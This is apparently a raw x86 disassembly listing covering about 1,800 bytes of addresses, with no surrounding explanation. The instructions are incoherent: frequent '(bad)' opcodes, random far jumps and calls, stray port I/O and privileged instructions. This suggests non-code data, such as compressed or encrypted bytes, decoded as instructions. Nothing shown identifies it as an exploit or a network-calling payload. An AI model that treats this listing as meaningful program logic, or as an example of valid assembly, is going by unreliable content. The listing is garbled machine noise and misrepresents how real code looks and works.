  6a9c87:	add    eax,0x886fc2cd
  6a9c8c:	mov    esp,0x98af1814
  6a9c91:	(bad)  
  6a9c92:	shl    BYTE PTR [eax+0x39],1
  6a9c95:	js     0x6a9c78
  6a9c97:	xor    DWORD PTR es:[edx],0xffffffaa
  6a9c9b:	push   ebx
  6a9c9c:	jns    0x6a9c2f
  6a9c9e:	bound  edi,QWORD PTR [eax]
  6a9ca0:	add    dl,BYTE PTR [eax]
  6a9ca2:	or     cl,BYTE PTR [edi-0xd]
  6a9ca5:	arpl   WORD PTR [ebp+0x4c1939df],ax
  6a9cab:	pushf  
  6a9cac:	rol    BYTE PTR [ebp+0x27],cl
  6a9caf:	shl    bh,cl
  6a9cb1:	adc    edi,DWORD PTR [esi-0x5b]
  6a9cb4:	gs add esp,ecx
  6a9cb7:	icebp  
  6a9cb8:	or     edx,DWORD PTR [edx]
  6a9cba:	cli    
  6a9cbb:	sub    BYTE PTR [edx+0x77],bl
  6a9cbe:	dec    edi
  6a9cbf:	inc    eax
  6a9cc0:	inc    ecx
  6a9cc1:	sub    DWORD PTR [ecx],esp
  6a9cc3:	arpl   cx,bp
  6a9cc5:	sbb    al,0x7a
  6a9cc7:	mov    gs,WORD PTR [eax+eax*8-0x2306023d]
  6a9cce:	clc    
  6a9ccf:	pop    edx
  6a9cd0:	cmp    al,0xd7
  6a9cd2:	int3   
  6a9cd3:	adc    BYTE PTR [edx+0x61],al
  6a9cd6:	in     al,0x55
  6a9cd8:	int    0xc
  6a9cda:	sub    DWORD PTR [eax],0x25
  6a9cdd:	daa    
  6a9cde:	inc    eax
  6a9cdf:	pop    edx
  6a9ce0:	lock or eax,0x83a4a88
  6a9ce6:	aam    0x68
  6a9ce8:	sbb    al,BYTE PTR [ebx-0x5f311525]
  6a9cee:	pop    ecx
  6a9cef:	fdiv   st,st(6)
  6a9cf1:	scas   eax,DWORD PTR es:[edi]
  6a9cf2:	test   al,0x6e
  6a9cf4:	ds pop edx
  6a9cf6:	jnp    0x6a9d4f
  6a9cf8:	sti    
  6a9cf9:	jge    0x6a9d74
  6a9cfb:	jmp    FWORD PTR [ecx]
  6a9cfd:	pop    ss
  6a9cfe:	scas   al,BYTE PTR es:[di]
  6a9d00:	icebp  
  6a9d01:	dec    BYTE PTR ds:[eax-0x64]
  6a9d05:	fcmovnbe st,st(3)
  6a9d07:	push   esi
  6a9d08:	mov    ebx,0xc86d5ba2
  6a9d0d:	push   esi
  6a9d0e:	adc    eax,0x15b8bf68
  6a9d13:	iret   
  6a9d14:	jo     0x6a9cb8
  6a9d16:	ss jle 0x6a9d25
  6a9d19:	mov    ds:0xf8cc9127,eax
  6a9d1e:	xchg   ecx,eax
  6a9d1f:	into   
  6a9d20:	neg    DWORD PTR [eax-0x6a]
  6a9d23:	cmp    eax,0x9c591385
  6a9d28:	mov    ebp,0xfd91a2b9
  6a9d2d:	jne    0x6a9cb9
  6a9d2f:	popa   
  6a9d30:	test   BYTE PTR [esi+0x14875b7d],0xda
  6a9d37:	loopne 0x6a9cef
  6a9d39:	ret    0x40f1
  6a9d3c:	call   0xb9126502
  6a9d41:	sub    DWORD PTR [ecx-0x1],esi
  6a9d44:	nop
  6a9d45:	call   0xa46b:0x7e8b05b9
  6a9d4c:	mov    dl,0x83
  6a9d4e:	and    al,0x40
  6a9d50:	jmp    0x6a9d80
  6a9d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a9d53:	loopne 0x6a9d9c
  6a9d55:	enter  0x69c5,0x4e
  6a9d59:	mov    WORD PTR [edi],?
  6a9d5b:	xchg   ecx,esi
  6a9d5d:	es popa 
  6a9d5f:	pop    eax
  6a9d60:	adc    ah,BYTE PTR [esi+0x510f926]
  6a9d66:	mov    edx,0x698083d2
  6a9d6b:	pop    ss
  6a9d6c:	mov    ecx,0xd37727fb
  6a9d71:	rcl    BYTE PTR [edi],1
  6a9d73:	jno    0x6a9d23
  6a9d75:	pushf  
  6a9d76:	sbb    eax,0x88a1fca1
  6a9d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a9d7c:	jo     0x6a9d97
  6a9d7e:	lods   eax,DWORD PTR ds:[esi]
  6a9d7f:	or     DWORD PTR [edx-0x28],ecx
  6a9d82:	fsin   
  6a9d84:	jns    0x6a9d28
  6a9d86:	fisttp WORD PTR [eax-0x30f92a1c]
  6a9d8c:	out    0x40,eax
  6a9d8e:	ror    ecx,1
  6a9d90:	into   
  6a9d91:	popf   
  6a9d92:	out    0x83,eax
  6a9d94:	js     0x6a9deb
  6a9d96:	ins    DWORD PTR es:[edi],dx
  6a9d97:	stos   BYTE PTR es:[edi],al
  6a9d98:	xchg   ebx,eax
  6a9d99:	repz div DWORD PTR [ecx-0x6a99fa01]
  6a9da0:	mov    al,ds:0xa464de84
  6a9da5:	lds    eax,FWORD PTR [ecx+0x643af518]
  6a9dab:	test   al,0xc8
  6a9dad:	popa   
  6a9dae:	fbld   TBYTE PTR [ecx-0x36]
  6a9db1:	xor    ah,BYTE PTR [edi+0x6]
  6a9db4:	clc    
  6a9db5:	fstp   QWORD PTR [edi]
  6a9db7:	call   0xa51e63e4
  6a9dbc:	sub    ah,0x3b
  6a9dbf:	fisub  DWORD PTR ds:0xaa3030bb
  6a9dc5:	push   es
  6a9dc6:	fist   WORD PTR [edi-0x54]
  6a9dc9:	cmp    esi,DWORD PTR [eax+0x13c0fa2d]
  6a9dcf:	dec    eax
  6a9dd0:	retf   0x95a4
  6a9dd3:	and    BYTE PTR [esi-0x771ad2c],dl
  6a9dd9:	fnstenv [esp+edx*2]
  6a9ddc:	mov    al,ds:0x6eaae1c2
  6a9de1:	out    0x1b,al
  6a9de3:	pop    ebx
  6a9de4:	daa    
  6a9de5:	or     al,0xbd
  6a9de7:	cmp    BYTE PTR [edx+0x6c285ee0],bh
  6a9ded:	fdivr  st,st(2)
  6a9def:	push   0x175a9c54
  6a9df4:	(bad)  
  6a9df5:	xchg   edx,eax
  6a9df6:	xchg   eax,ebp
  6a9df8:	push   ebp
  6a9df9:	aaa    
  6a9dfa:	imul   ebx,DWORD PTR [edx+ebx*2],0xffffffc7
  6a9dfe:	xor    DWORD PTR [edi-0x584de362],0xbf109b7a
  6a9e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a9e09:	(bad)  
  6a9e0b:	xchg   edi,eax
  6a9e0c:	stos   DWORD PTR es:[edi],eax
  6a9e0d:	push   0xffffff8c
  6a9e0f:	mov    fs,WORD PTR [ebx-0x38]
  6a9e12:	push   ebp
  6a9e13:	loope  0x6a9d97
  6a9e15:	je     0x6a9e19
  6a9e17:	sub    DWORD PTR [ecx+ebp*1],eax
  6a9e1a:	xlat   BYTE PTR ds:[ebx]
  6a9e1b:	sbb    dh,BYTE PTR [ebp+0x2ae92740]
  6a9e21:	aad    0xf4
  6a9e23:	popa   
  6a9e24:	into   
  6a9e25:	and    eax,0x7d675a0e
  6a9e2a:	test   edx,0x397f338a
  6a9e30:	pusha  
  6a9e31:	shr    DWORD PTR [ecx+0x26],0x18
  6a9e35:	mov    al,0x88
  6a9e37:	mov    DWORD PTR [esi-0x751ea841],0xea25e8fa
  6a9e41:	and    dh,BYTE PTR [edi]
  6a9e43:	test   al,0x27
  6a9e45:	jecxz  0x6a9e0c
  6a9e47:	mov    dh,0xe9
  6a9e49:	mov    cl,0x28
  6a9e4b:	popa   
  6a9e4c:	lds    edx,FWORD PTR ds:0x56dce367
  6a9e52:	pop    ss
  6a9e53:	repnz or DWORD PTR [ebx],eax
  6a9e56:	cmp    DWORD PTR [ecx-0x32e4daad],esi
  6a9e5c:	sbb    cl,BYTE PTR [ebp-0x3ef4dfa7]
  6a9e62:	push   ds
  6a9e63:	cld    
  6a9e64:	xchg   edi,eax
  6a9e65:	sti    
  6a9e66:	add    edi,DWORD PTR [edi+0x2844c16a]
  6a9e6c:	lods   eax,DWORD PTR ds:[esi]
  6a9e6d:	xlat   BYTE PTR ds:[ebx]
  6a9e6e:	mov    cl,0x59
  6a9e70:	cld    
  6a9e71:	and    ebp,DWORD PTR [ebx+ebx*4+0x37c705fd]
  6a9e78:	add    dh,BYTE PTR [ebp+0x42040e74]
  6a9e7e:	or     al,0x38
  6a9e80:	pop    ss
  6a9e81:	or     BYTE PTR [ebp+0x5266ed7e],dh
  6a9e87:	std    
  6a9e88:	je     0x6a9e2c
  6a9e8a:	shrd   esp,edi,0xe9
  6a9e8e:	sbb    eax,0xfacb5f00
  6a9e93:	aas    
  6a9e94:	mov    eax,0x14e57e1d
  6a9e99:	mov    ch,0x98
  6a9e9b:	(bad)  
  6a9e9c:	mov    ds:0x394faf16,eax
  6a9ea2:	pop    ebp
  6a9ea3:	add    al,0xd5
  6a9ea5:	pop    ss
  6a9ea6:	jecxz  0x6a9f0b
  6a9ea8:	inc    ebp
  6a9ea9:	or     al,cl
  6a9eab:	lock jb 0x6a9e8c
  6a9eae:	out    0x3d,eax
  6a9eb0:	mov    ds:0x2f6e5b16,eax
  6a9eb5:	gs fcmovb st,st(7)
  6a9eb8:	ja     0x6a9ef5
  6a9eba:	and    ch,BYTE PTR [ecx+0x64403d88]
  6a9ec0:	push   ebx
  6a9ec1:	inc    ecx
  6a9ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a9ec3:	mov    ch,0xde
  6a9ec5:	jecxz  0x6a9e55
  6a9ec7:	cmp    bl,ch
  6a9ec9:	pushf  
  6a9eca:	mov    bl,0xe9
  6a9ecc:	xor    esp,esi
  6a9ece:	pop    esp
  6a9ecf:	cs sbb eax,0x9377b2e4
  6a9ed5:	div    DWORD PTR [ebp*2-0x4715f592]
  6a9edc:	xor    al,0x54
  6a9ede:	enter  0x6146,0x2e
  6a9ee2:	push   es
  6a9ee3:	bnd jae 0x6a9ec1
  6a9ee6:	stos   DWORD PTR es:[edi],eax
  6a9ee7:	adc    esi,esp
  6a9ee9:	mov    ebp,0xdf1a1705
  6a9eee:	push   ecx
  6a9eef:	ds pop edx
  6a9ef1:	jmp    0x6a9f0f
  6a9ef3:	mov    WORD PTR [esi],ss
  6a9ef5:	jle    0x6a9ec3
  6a9ef7:	mov    DWORD PTR [edx],edi
  6a9ef9:	std    
  6a9efa:	gs leave 
  6a9efc:	je     0x6a9efb
  6a9efe:	adc    al,dl
  6a9f00:	xor    ebp,edi
  6a9f02:	stos   DWORD PTR es:[edi],eax
  6a9f03:	ins    BYTE PTR es:[edi],dx
  6a9f04:	scas   al,BYTE PTR es:[edi]
  6a9f05:	js     0x6a9ec2
  6a9f07:	xchg   ecx,eax
  6a9f08:	mov    esi,0x5fd4f352
  6a9f0d:	loope  0x6a9ee1
  6a9f0f:	pop    edx
  6a9f10:	mov    esi,DWORD PTR [esi-0x8]
  6a9f13:	jns    0x6a9f38
  6a9f15:	int3   
  6a9f16:	and    dh,BYTE PTR [ebp-0x3c]
  6a9f19:	jbe    0x6a9f93
  6a9f1b:	loope  0x6a9f45
  6a9f1d:	mov    cl,0x8e
  6a9f1f:	push   ss
  6a9f20:	adc    edx,DWORD PTR [ebp-0x46]
  6a9f23:	mov    ds:0xb86321d9,eax
  6a9f28:	and    al,0x47
  6a9f2a:	inc    ebx
  6a9f2b:	dec    edx
  6a9f2c:	push   ebp
  6a9f2d:	ja     0x6a9f32
  6a9f2f:	inc    eax
  6a9f30:	outs   dx,BYTE PTR ds:[esi]
  6a9f31:	loopne 0x6a9f54
  6a9f33:	and    al,0x35
  6a9f35:	sub    al,0x6a
  6a9f37:	adc    al,0x1a
  6a9f39:	enter  0x8a2a,0xf1
  6a9f3d:	adc    edx,ebp
  6a9f3f:	mov    ebx,0x58e869ec
  6a9f44:	scas   al,BYTE PTR es:[edi]
  6a9f45:	xchg   esi,eax
  6a9f46:	jnp    0x6a9f91
  6a9f48:	jecxz  0x6a9eea
  6a9f4a:	cdq    
  6a9f4b:	les    ebp,FWORD PTR [eax+0x24]
  6a9f4e:	cmp    al,0x5d
  6a9f50:	mov    cl,0x71
  6a9f52:	test   eax,0x81f08ce1
  6a9f57:	mov    ss,WORD PTR [bx+di]
  6a9f5a:	jecxz  0x6a9f28
  6a9f5c:	mov    WORD PTR [edx],gs
  6a9f5e:	(bad)  
  6a9f60:	in     eax,dx
  6a9f61:	adc    edi,DWORD PTR [edi+0x3b]
  6a9f64:	mov    ch,0x3f
  6a9f66:	jne    0xa18fb21d
  6a9f6c:	cmp    ebp,DWORD PTR [esi+0x3a48af06]
  6a9f72:	push   eax
  6a9f73:	inc    ebx
  6a9f74:	pop    es
  6a9f75:	arpl   WORD PTR [ecx-0x16],di
  6a9f78:	clc    
  6a9f79:	or     esi,DWORD PTR [ebx]
  6a9f7b:	cmp    eax,0x3058b48b
  6a9f80:	stos   BYTE PTR es:[edi],al
  6a9f81:	(bad)  
  6a9f83:	repz xchg esp,eax
  6a9f85:	cmp    esp,edx
  6a9f87:	js     0x6a9f9c
  6a9f89:	cwde   
  6a9f8a:	not    esi
  6a9f8c:	push   eax
  6a9f8d:	adc    BYTE PTR [ecx+0x25554991],dl
  6a9f93:	mov    bh,0xd
  6a9f95:	jecxz  0x6a9f4f
  6a9f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a9f98:	xor    bh,BYTE PTR [ebx-0x53]
  6a9f9b:	cmp    bh,BYTE PTR [eax]
  6a9f9d:	adc    eax,0x9c914bfe
  6a9fa2:	fldenv [esi-0x1858ba52]
  6a9fa8:	jb     0x6a9fd9
  6a9faa:	adc    ebx,DWORD PTR [ebp+0x29ba3562]
  6a9fb0:	mov    ah,0xc1
  6a9fb2:	call   0x947b:0xa249a2a9
  6a9fb9:	push   esp
  6a9fba:	scas   al,BYTE PTR es:[edi]
  6a9fbb:	loope  0x6a9f48
  6a9fbd:	rol    BYTE PTR [ebx+0x35],0x25
  6a9fc1:	int3   
  6a9fc2:	add    DWORD PTR [edi-0x28],0xffffffaf
  6a9fc6:	pop    eax
  6a9fc7:	sub    ebp,DWORD PTR [ebx+eiz*2-0x6c]
  6a9fcb:	or     al,0x1e
  6a9fcd:	xchg   ecx,eax
  6a9fce:	fucomip st,st(2)
  6a9fd0:	push   es
  6a9fd1:	sub    eax,0xfcdbe963
  6a9fd6:	adc    eax,0xeff0138f
  6a9fdb:	adc    bl,BYTE PTR [edx-0xf1b9f8e]
  6a9fe1:	push   ebx
  6a9fe2:	mov    eax,DWORD PTR [esi+eiz*2]
  6a9fe5:	rcr    BYTE PTR [ebx],0xd7
  6a9fe8:	lahf   
  6a9fe9:	pop    esi
  6a9fea:	je     0x6a9faa
  6a9fec:	punpckldq mm1,DWORD PTR [eax]
  6a9fef:	pusha  
  6a9ff0:	retf   0x4e12
  6a9ff3:	scas   al,BYTE PTR es:[edi]
  6a9ff4:	retf   0x9248
  6a9ff7:	adc    DWORD PTR [ebx],ebx
  6a9ff9:	pop    esi
  6a9ffa:	jl     0x6a9f94
  6a9ffc:	cmp    eax,0xcbae8927
  6aa001:	jns    0x6aa01f
  6aa003:	push   ebx
  6aa004:	push   0x78
  6aa006:	pop    ds
  6aa007:	mov    edx,0xb69c654f
  6aa00c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aa00d:	xchg   ebx,eax
  6aa00e:	hlt    
  6aa00f:	or     DWORD PTR ds:0xddb7b3d,edx
  6aa015:	jecxz  0x6aa01a
  6aa017:	bound  esp,QWORD PTR [esi]
  6aa019:	push   edi
  6aa01a:	cld    
  6aa01b:	xor    ebx,ecx
  6aa01d:	pop    ebx
  6aa01e:	xchg   esp,eax
  6aa01f:	call   0x2acb2e96
  6aa024:	scas   eax,DWORD PTR es:[edi]
  6aa025:	es cld 
  6aa027:	cmp    al,0x5
  6aa029:	arpl   cx,si
  6aa02b:	test   DWORD PTR [ebx-0x9e4a583],esp
  6aa031:	in     al,0xc7
  6aa033:	jne    0x6aa0a9
  6aa035:	jne    0x6aa084
  6aa037:	sbb    eax,0xee700d6c
  6aa03c:	sahf   
  6aa03d:	repz fs push ds
  6aa040:	and    ch,BYTE PTR [edi+0x46]
  6aa043:	and    BYTE PTR [ebx],cl
  6aa045:	mov    dl,0x71
  6aa047:	pop    eax
  6aa048:	ds test edi,0xa2baac3f
  6aa04f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6aa050:	add    DWORD PTR [edi-0x49db2c0a],ebx
  6aa056:	mov    esi,0x5cef49f2
  6aa05b:	dec    ebx
  6aa05c:	or     cl,BYTE PTR [eax]
  6aa05e:	retf   
  6aa05f:	ficomp DWORD PTR [esi+0x121a14d4]
  6aa065:	lods   al,BYTE PTR ds:[esi]
  6aa066:	pop    eax
  6aa067:	icebp  
  6aa068:	lods   al,BYTE PTR ds:[esi]
  6aa069:	ins    DWORD PTR es:[edi],dx
  6aa06a:	jge    0x6aa030
  6aa06c:	imul   ecx,DWORD PTR [ebp+0x15],0xbb60f225
  6aa073:	pop    ebx
  6aa074:	mov    fs,WORD PTR [ebp-0x56fc79c1]
  6aa07a:	dec    edi
  6aa07b:	and    DWORD PTR [esi],ebx
  6aa07d:	je     0x6aa028
  6aa07f:	stos   BYTE PTR es:[edi],al
  6aa080:	mov    edi,0xe1393bc6
  6aa085:	(bad)  
  6aa086:	dec    ebx
  6aa087:	push   0x83c6fa43
  6aa08c:	fdivr  DWORD PTR [ecx+0x6b8f2822]
  6aa092:	pusha  
  6aa093:	sti    
  6aa094:	add    BYTE PTR [esi],cl
  6aa096:	fwait
  6aa097:	dec    ecx
  6aa098:	push   0x53650fbd
  6aa09d:	cmc    
  6aa09e:	adc    dh,BYTE PTR [edx+0x29]
  6aa0a1:	cmp    cl,BYTE PTR ds:0xd9a9c5c5
  6aa0a7:	cmp    eax,0xad93b2e1
  6aa0ac:	daa    
  6aa0ad:	jmp    0x6aa02f
  6aa0af:	and    BYTE PTR [esi+esi*4],dl
  6aa0b2:	xchg   edi,eax
  6aa0b3:	jmp    0xf92c:0x717d7101
  6aa0ba:	cmc    
  6aa0bb:	fsub   DWORD PTR [eax+esi*4+0x2e87eb6b]
  6aa0c2:	push   ss
  6aa0c3:	js     0x6aa06e
  6aa0c5:	cmp    al,0xd6
  6aa0c7:	mov    al,ds:0xfeba2d5
  6aa0cc:	jle    0x6aa0a8
  6aa0ce:	mov    eax,ds:0xae0fba46
  6aa0d3:	push   0xbe9c792f
  6aa0d8:	mov    ebx,0x19851979
  6aa0dd:	repz push ecx
  6aa0df:	jno    0x6aa145
  6aa0e1:	popf   
  6aa0e2:	jns    0x6aa113
  6aa0e4:	mov    ah,0x3f
  6aa0e6:	inc    esi
  6aa0e7:	or     eax,0x5970f99c
  6aa0ec:	dec    edx
  6aa0ed:	out    0xbf,eax
  6aa0ef:	cmovp  ebp,DWORD PTR [ebp-0x3b252f02]
  6aa0f6:	jo     0x6aa0de
  6aa0f8:	retf   0x7e5e
  6aa0fb:	push   ebp
  6aa0fc:	xchg   ebp,eax
  6aa0fd:	jmp    0x4af409c4
  6aa102:	pop    ds
  6aa103:	adc    ecx,DWORD PTR [edx+0x12]
  6aa106:	jl     0x6aa11d
  6aa108:	pop    ecx
  6aa109:	outs   dx,BYTE PTR ds:[esi]
  6aa10a:	and    al,0x82
  6aa10c:	xchg   ecx,eax
  6aa10d:	retf   
  6aa10e:	jge    0x6aa10e
  6aa110:	jae    0x6aa16f
  6aa112:	ds mov dl,0x6a
  6aa115:	push   ebp
  6aa116:	arpl   WORD PTR [esi+0x13cd4bec],sp
  6aa11c:	adc    BYTE PTR [ebp+0x3c],al
  6aa11f:	jge    0x6aa0de
  6aa121:	std    
  6aa122:	jne    0x6aa141
  6aa124:	test   BYTE PTR [esi+0x770189b4],dh
  6aa12a:	sbb    BYTE PTR [ecx],dh
  6aa12c:	push   es
  6aa12d:	pop    esp
  6aa12e:	xchg   ebp,eax
  6aa12f:	inc    esp
  6aa130:	retf   0xfe83
  6aa133:	test   eax,0x705cf2b1
  6aa138:	addr16 xchg esp,eax
  6aa13a:	aam    0x0
  6aa13c:	out    dx,al
  6aa13d:	cwde   
  6aa13e:	adc    cl,BYTE PTR [ebp-0x5f59ae2a]
  6aa144:	call   0xd7fd:0xe837d488
  6aa14b:	xor    BYTE PTR [eax-0x5783cb],dh
  6aa151:	es icebp 
  6aa153:	ja     0x6aa1a0
  6aa155:	ret    0xff45
  6aa158:	sbb    eax,0x865a3856
  6aa15d:	retf   0xbde4
  6aa160:	retf   0xdac1
  6aa163:	repnz mov edx,0xec6fd364
  6aa169:	jae    0x6aa149
  6aa16b:	mov    ss,WORD PTR [eax+0x49634f52]
  6aa171:	fistp  WORD PTR [edx+0x61ec64a0]
  6aa177:	out    0x27,eax
  6aa179:	mov    DWORD PTR [ecx],ebp
  6aa17b:	cmp    dl,dh
  6aa17d:	test   al,0x14
  6aa17f:	push   eax
  6aa180:	inc    edx
  6aa181:	test   al,0x92
  6aa183:	xor    eax,0x3943f639
  6aa188:	mov    BYTE PTR [esi+eiz*4-0x75a365f3],dh
  6aa18f:	inc    esp
  6aa190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aa191:	push   ss
  6aa192:	mov    WORD PTR [edi-0xba04b53],?
  6aa198:	and    al,0x88
  6aa19a:	add    al,0xa7
  6aa19c:	fucomp st(5)
  6aa19e:	jae    0x6aa14c
  6aa1a0:	add    al,0x28
  6aa1a2:	add    edi,esi
  6aa1a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6aa1a5:	rol    BYTE PTR [eax],cl
  6aa1a7:	and    eax,0x563ba4b
  6aa1ac:	jmp    0xca9445c2
  6aa1b1:	(bad)
  6aa1b4:	lahf   
  6aa1b5:	mov    bh,0xbb
  6aa1b7:	gs pmulhw mm6,mm6
  6aa1bb:	xchg   esi,eax
  6aa1bc:	mov    al,ds:0x29bb0f5f
  6aa1c1:	enter  0x6f4f,0xa9
  6aa1c5:	dec    DWORD PTR [edx]
  6aa1c7:	mov    ecx,DWORD PTR [ecx+0x7d56e7e0]
  6aa1cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6aa1ce:	and    dh,bl
  6aa1d0:	loope  0x6aa1ff
  6aa1d2:	mov    ss,WORD PTR [esi+0x63bbab9b]
  6aa1d8:	cwde   
  6aa1d9:	ret    
  6aa1da:	enter  0x3e1f,0x4e
  6aa1de:	cmp    al,0xb4
  6aa1e0:	iret   
  6aa1e1:	lea    esp,[esi-0x2851836]
  6aa1e7:	addr16 xor dh,ah
  6aa1ea:	sub    esp,DWORD PTR [ebp-0x6f431695]
  6aa1f0:	das    
  6aa1f1:	stos   DWORD PTR es:[edi],eax
  6aa1f2:	add    al,0x3
  6aa1f4:	inc    edi
  6aa1f5:	ins    DWORD PTR es:[edi],dx
  6aa1f6:	out    dx,al
  6aa1f7:	enter  0xbcae,0xd7
  6aa1fb:	ds adc eax,0x486db1ce
  6aa201:	popa   
  6aa202:	sar    BYTE PTR [ecx-0x60fa1854],0x9d
  6aa209:	and    DWORD PTR [esi],eax
  6aa20b:	add    edi,esp
  6aa20d:	arpl   WORD PTR [edi],cx
  6aa20f:	xchg   esi,eax
  6aa210:	or     ecx,DWORD PTR [ecx-0x66be680b]
  6aa216:	push   ds
  6aa217:	pop    ds
  6aa218:	test   DWORD PTR [esi-0x71d62630],eax
  6aa21e:	inc    ebp
  6aa21f:	out    0xb1,eax
  6aa221:	mov    dh,0x2d
  6aa223:	jmp    0xd93f9cd3
  6aa228:	cwde   
  6aa229:	call   0xc93c0b2c
  6aa22e:	xchg   esp,eax
  6aa22f:	xor    al,0x2b
  6aa231:	pop    ss
  6aa232:	dec    eax
  6aa233:	test   BYTE PTR [edx],bl
  6aa235:	mov    esp,0xe0ff6f2e
  6aa23a:	xor    ebp,DWORD PTR [ecx]
  6aa23c:	sub    ebx,edx
  6aa23e:	gs push es
  6aa240:	push   cs
  6aa241:	arpl   WORD PTR [ebp-0x7e],si
  6aa244:	fs pop es
  6aa246:	jle    0x6aa1dc
  6aa248:	and    ah,BYTE PTR [edx+0x63f2cb24]
  6aa24e:	scas   al,BYTE PTR es:[edi]
  6aa24f:	test   eax,0xd8242443
  6aa254:	xchg   ecx,eax
  6aa255:	scas   al,BYTE PTR es:[edi]
  6aa256:	adc    BYTE PTR [edi-0x7392488f],bh
  6aa25c:	addr16 cdq 
  6aa25e:	xchg   BYTE PTR [eax-0x6b786232],al
  6aa264:	stos   BYTE PTR es:[edi],al
  6aa265:	aaa    
  6aa266:	arpl   WORD PTR [edx],cx
  6aa268:	fnstenv [eax-0x8]
  6aa26b:	arpl   cx,bp
  6aa26d:	(bad)  
  6aa26e:	mov    ds:0xfe14c0dc,al
  6aa273:	push   0xffffffeb
  6aa275:	pop    es
  6aa276:	inc    esp
  6aa277:	mov    edx,0xfc790134
  6aa27c:	pop    ebp
  6aa27d:	shr    DWORD PTR [esi],0x81
  6aa280:	aas    
  6aa281:	adc    DWORD PTR [edi-0x48],ecx
  6aa284:	fbstp  TBYTE PTR [edi-0x21ea5fbd]
  6aa28a:	xchg   ebp,eax
  6aa28b:	(bad)  
  6aa28c:	mov    al,ds:0x1d61e3e0
  6aa291:	xchg   edx,eax
  6aa292:	rcl    DWORD PTR [edx+0x22],cl
  6aa295:	inc    esi
  6aa296:	and    BYTE PTR [esi-0x45],ch
  6aa299:	inc    edx
  6aa29a:	push   0xdf3e5b22
  6aa29f:	dec    esi
  6aa2a0:	stc    
  6aa2a1:	repz mov ah,0xe2
  6aa2a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aa2a5:	mov    DWORD PTR [ecx],esi
  6aa2a7:	in     al,dx
  6aa2a8:	mov    ch,0x98
  6aa2aa:	aad    0xfd
  6aa2ac:	cmc    
  6aa2ad:	xchg   edi,eax
  6aa2ae:	mov    dh,bl
  6aa2b0:	xor    ebx,ebp
  6aa2b2:	and    ch,dh
  6aa2b4:	loopne 0x6aa30c
  6aa2b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6aa2b7:	fadd   DWORD PTR [esi+0x53]
  6aa2ba:	mov    fs,WORD PTR [edx-0x2e]
  6aa2bd:	mov    eax,ds:0xac896d7f
  6aa2c2:	int3   
  6aa2c3:	cmp    DWORD PTR [ebx+0x4f6d56a],ebp
  6aa2c9:	cld    
  6aa2ca:	(bad)  
  6aa2cb:	dec    ebx
  6aa2cc:	mov    esp,0xd0257ccf
  6aa2d1:	xlat   BYTE PTR ds:[ebx]
  6aa2d2:	cs fxam 
  6aa2d5:	(bad)
  6aa2d8:	lea    ebx,[eax+ecx*2]
  6aa2db:	push   ss
  6aa2dc:	shr    DWORD PTR [edx+0x7796d545],cl
  6aa2e2:	popf   
  6aa2e3:	pop    es
  6aa2e4:	shr    BYTE PTR [ebx],cl
  6aa2e6:	stos   BYTE PTR es:[edi],al
  6aa2e7:	ja     0x6aa27a
  6aa2e9:	push   esi
  6aa2ea:	out    dx,al
  6aa2eb:	push   edi
  6aa2ec:	bound  ebx,QWORD PTR [eax]
  6aa2ee:	inc    ebp
  6aa2ef:	jne    0x6aa332
  6aa2f1:	stc    
  6aa2f2:	outs   dx,BYTE PTR ds:[esi]
  6aa2f3:	or     eax,0x2cd9aa87
  6aa2f8:	leave  
  6aa2f9:	retf   0xd8d5
  6aa2fc:	cli    
  6aa2fd:	cmc    
  6aa2fe:	dec    ecx
  6aa300:	(bad)  
  6aa301:	xlat   BYTE PTR ds:[ebx]
  6aa302:	push   ds
  6aa303:	aam    0x5d
  6aa305:	inc    ebp
  6aa306:	sub    eax,esp
  6aa308:	(bad)  
  6aa309:	fadd   st,st(2)
  6aa30b:	mov    edx,DWORD PTR [ebx]
  6aa30d:	or     eax,0xed50b162
  6aa312:	int    0x77
  6aa314:	push   edx
  6aa315:	clc    
  6aa316:	jecxz  0x6aa320
  6aa318:	jge    0x6aa2a8
  6aa31a:	xor    al,0x27
  6aa31c:	mov    esp,0x2d7daad3
  6aa321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6aa322:	adc    dh,bl
  6aa324:	push   ss
  6aa325:	add    DWORD PTR cs:[ebx],eax
  6aa328:	std    
  6aa329:	inc    eax
  6aa32a:	dec    esi
  6aa32b:	xchg   ebx,eax
  6aa32c:	sub    eax,0x2caa15bd
  6aa331:	stos   BYTE PTR es:[edi],al
  6aa332:	je     0x6aa30f
  6aa334:	sbb    al,0x17
  6aa336:	ins    BYTE PTR es:[edi],dx
  6aa337:	ins    BYTE PTR es:[edi],dx
  6aa338:	adc    BYTE PTR [ebx],al
  6aa33a:	fdivr  st(7),st
  6aa33c:	mov    al,ds:0x79123e38
  6aa341:	aam    0x62
  6aa343:	bound  ebp,QWORD PTR [edx]
  6aa345:	(bad)  
  6aa346:	test   edi,ecx
  6aa348:	inc    esp
  6aa349:	push   esp
  6aa34a:	ficomp WORD PTR [eax]
  6aa34c:	icebp  
  6aa34d:	cdq    
  6aa34e:	inc    edx
  6aa34f:	dec    DWORD PTR [edi+0x2d]
  6aa352:	xor    ebx,esp
  6aa354:	and    eax,ebp
  6aa356:	xor    al,0x0
  6aa358:	aas    
  6aa359:	stos   BYTE PTR es:[edi],al
  6aa35a:	adc    eax,0x2fd23cd8
  6aa35f:	icebp  
  6aa360:	nop
  6aa361:	mov    ah,0xcc
  6aa363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aa364:	jmp    0xfeea948b
  6aa369:	and    al,0x6e
  6aa36b:	bound  edi,QWORD PTR [edi]
  6aa36d:	jmp    0x1a5540e
  6aa372:	jge    0x6aa330
  6aa374:	xlat   BYTE PTR ds:[ebx]
  6aa375:	in     eax,dx
  6aa376:	mov    ds:0x7e4146df,al
  6aa37b:	leave  
  6aa37c:	hlt    
